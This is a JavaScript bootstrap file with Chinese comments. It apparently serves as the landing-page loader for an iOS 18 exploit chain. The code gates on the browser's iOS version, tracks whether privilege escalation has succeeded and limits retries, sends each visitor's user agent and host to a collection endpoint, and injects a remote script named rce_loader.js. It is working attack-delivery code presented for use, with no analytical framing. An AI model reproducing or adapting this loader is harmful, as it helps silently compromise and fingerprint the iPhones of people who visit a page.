/* boot.js —— 单链交付入口：门禁（PE 锁 + 尝试窗口）+ 引导
 *
 * 设计（对齐 group.html 的门禁口径，抽出为独立 JS）：
 *   - PE 锁:  _x_pe_done（localStorage 或 cookie，毫秒时间戳，TTL 10min）
 *             cookie 由交付侧下发 pe_worker.js 时种下，覆盖 WebContent 崩溃场景
 *   - 尝试窗口: _x_try ≤ 5 / 10min（崩溃重载不会无限重打）
 *   - ?force=1: 清态一次并从 URL 剥离
 *
 * 单链：无渠道、无 iOS 版本分叉，直接加载一条链（CHAIN）。
 */
(function () {
  "use strict";

  // ── 单链目标（唯一入口；按需改这里即可换链）──
  var CHAIN = "/love/rce_loader.js";

  // ── 版本约束：单链只支持 iOS 18.x ──
  var IOS_MAJOR = 18;
  function iosMajor() {
    var m = /iPhone OS (\d+)_/.exec(navigator.userAgent) ||
            /CPU (?:iPhone )?OS (\d+)_/.exec(navigator.userAgent);
    return m ? parseInt(m[1], 10) : 0;
  }
  // 真机 iOS 非 18 直接不跑（避免不匹配链导致卡死）；非 iOS（桌面/联调）放行。
  if (/iPhone|iPad|iPod/.test(navigator.userAgent) && iosMajor() !== IOS_MAJOR) {
    return;
  }

  // ── 门禁参数 ──
  var MAX_TRIES = 5;
  var PE_TTL_MS = 10 * 60 * 1000;
  var K_PE = "_x_pe_done";
  var K_TRY = "_x_try";
  var K_TRY_TS = "_x_try_ts";

  function lsGet(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
  function lsSet(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
  function lsDel(k) { try { localStorage.removeItem(k); } catch (e) {} }
  function cookieGet(name) {
    try {
      var m = document.cookie.match(new RegExp("(?:^|; )" + name + "=([^;]*)"));
      return m ? decodeURIComponent(m[1]) : null;
    } catch (e) { return null; }
  }
  function cookieSet(name, val, maxAgeSec) {
    try {
      document.cookie = name + "=" + encodeURIComponent(val) +
        "; Path=/; Max-Age=" + maxAgeSec + "; SameSite=Lax";
    } catch (e) {}
  }
  function cookieDel(name) {
    try { document.cookie = name + "=; Path=/; Max-Age=0; SameSite=Lax"; } catch (e) {}
  }
  function peDoneTs() {
    var a = parseInt(lsGet(K_PE) || "0", 10) || 0;
    var b = parseInt(cookieGet(K_PE) || "0", 10) || 0;
    return Math.max(a, b);
  }
  function clearAll() {
    lsDel(K_PE); lsDel(K_TRY); lsDel(K_TRY_TS); lsDel("_x_ok");
    cookieDel(K_PE);
  }

  // ── 入口登记（无渠道：仅 deviceVersion + domain，同源相对路径）──
  function reportEntry() {
    try {
      var payload = JSON.stringify({
        deviceVersion: navigator.userAgent || "",
        domain: location.host || ""
      });
      if (navigator.sendBeacon) {
        navigator.sendBeacon("/api/ip-sync/sync", new Blob([payload], { type: "application/json" }));
      } else {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/api/ip-sync/sync", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(payload);
      }
    } catch (e) {}
  }

  // ── 门禁判定 ──
  var force = false;
  try {
    lsDel("_x_ok"); // 清历史永久锁

    var q = location.search || "";
    force = /(?:^|[?&])force=1(?:&|$)/.test(q);
    if (force) {
      clearAll();
      try {
        var u = new URL(location.href);
        u.searchParams.delete("force");
        history.replaceState(null, "", u.pathname + (u.search || "") + (u.hash || ""));
      } catch (eStrip) {}
    }

    var now = Date.now();
    var peTs = peDoneTs();
    if (peTs && (now - peTs) < PE_TTL_MS && !force) {
      // PE 成功锁：同步双存储剩余 TTL，直接返回（不再重打）
      lsSet(K_PE, String(peTs));
      cookieSet(K_PE, String(peTs), Math.ceil((PE_TTL_MS - (now - peTs)) / 1000));
      return;
    }
    if (peTs && (now - peTs) >= PE_TTL_MS) {
      lsDel(K_PE);
      cookieDel(K_PE);
    }

    var tryN = parseInt(lsGet(K_TRY) || "0", 10) || 0;
    var tryTs = parseInt(lsGet(K_TRY_TS) || "0", 10) || 0;
    if (tryN > 0 && tryTs && (now - tryTs) >= PE_TTL_MS) {
      tryN = 0;
      lsDel(K_TRY);
      lsDel(K_TRY_TS);
    }
    if (tryN >= MAX_TRIES && !force) {
      return; // 本窗口尝试耗尽
    }

    tryN += 1;
    lsSet(K_TRY, String(tryN));
    if (tryN === 1 || !tryTs) lsSet(K_TRY_TS, String(now));
  } catch (e) {}

  // ── 单链引导 ──
  reportEntry();
  var s = document.createElement("script");
  s.src = CHAIN + "?" + Date.now();
  document.body.appendChild(s);
})();
